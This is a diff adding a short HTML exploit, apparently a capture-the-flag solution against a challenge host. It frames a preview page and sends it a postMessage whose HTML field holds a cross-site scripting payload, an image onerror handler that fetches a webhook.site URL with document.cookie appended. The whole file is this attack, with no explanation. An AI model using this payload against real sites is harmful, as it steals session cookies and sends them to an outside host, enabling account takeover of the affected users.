@@ -1,0 +1,8 @@
+<iframe id="f" src="https://1d94b573-59df-4eeb-b0cd-381f96365e5c.offsec.m0lecon.it/preview"></iframe>
+<script>
+  document.getElementById('f').addEventListener('load', () => {
+    document.getElementById('f').contentWindow.postMessage({
+      html: '<img src=x onerror="fetch(`https://webhook.site/9dcecff6-a3c6-4282-a9f4-1e79b472a7ed?c=`+document.cookie)">'
+    }, '*');
+  });
+</script>
